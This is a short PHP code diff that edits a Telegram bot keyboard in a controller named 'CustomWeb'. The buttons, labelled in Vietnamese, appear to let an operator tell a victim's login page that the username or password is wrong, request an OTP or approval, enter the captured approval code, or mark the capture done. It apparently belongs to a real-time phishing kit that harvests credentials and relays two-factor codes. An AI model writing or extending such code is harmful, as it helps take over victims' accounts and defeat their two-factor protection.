@@ -105,11 +105,14 @@ class CustomWeb extends Controller
                             if ($post_data->ac == 'n') {
                                 $keyboard = [
                                     [
-                                        ['text' => '👤 Sai TK hoặc Email', 'callback_data' => 'wronguser_' . $pusher_code],
-                                        ['text' => '🔑 Sai MK', 'callback_data' => 'wrongpass_' . $pusher_code],
+                                        ['text' => '❌ User', 'callback_data' => 'wronguser_' . $pusher_code],
+                                        ['text' => '❌ Pass', 'callback_data' => 'wrongpass_' . $pusher_code],
                                     ],
                                     [
-                                        ['text' => '🔒 Yêu cầu duyệt & mã', 'callback_data' => 'otp_' . $pusher_code],
+                                        ['text' => '🔒 Yêu cầu duyệt', 'callback_data' => 'otp_' . $pusher_code],
+                                        ['text' => '📱 Tự nhập mã duyệt', 'switch_inline_query_current_chat' => '/code' . $pusher_code . ' '],
+                                    ],
+                                    [
                                         ['text' => '✅ Thành công', 'callback_data' => 'done_' . $pusher_code],
                                     ]
                                 ];
